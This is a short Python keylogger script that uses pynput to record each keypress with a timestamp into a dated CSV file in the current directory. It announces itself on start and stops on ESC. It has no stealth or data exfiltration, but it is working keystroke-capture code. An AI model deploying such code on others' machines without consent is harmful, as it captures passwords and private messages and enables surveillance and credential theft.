from pynput import keyboard
import datetime
import os
import csv

# Use current working directory for log storage
log_dir = os.getcwd()  # or just use "." for current directory

def get_log_file():
    """Generate log file path based on current date."""
    filename = datetime.datetime.now().strftime("key_log_%Y-%m-%d.csv")
    return os.path.join(log_dir, filename)

def format_key(key):
    """Return a readable string representation of a key."""
    try:
        if hasattr(key, 'char') and key.char is not None:
            return key.char
        else:
            key_name = str(key).replace("Key.", "").replace("_", " ").upper()
            return f"[{key_name}]"
    except Exception:
        return "[UNKNOWN]"

def write_to_file(key):
    log_file = get_log_file()
    try:
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open(log_file, mode='a', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow([timestamp, format_key(key)])
    except Exception as e:
        with open("error_log.txt", "a", encoding='utf-8') as err:
            err.write(f"{datetime.datetime.now()} - {str(e)}\n")

def on_press(key):
    write_to_file(key)
    if key == keyboard.Key.esc:
        return False

if __name__ == "__main__":
    print("Starting keylogger. Press ESC to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

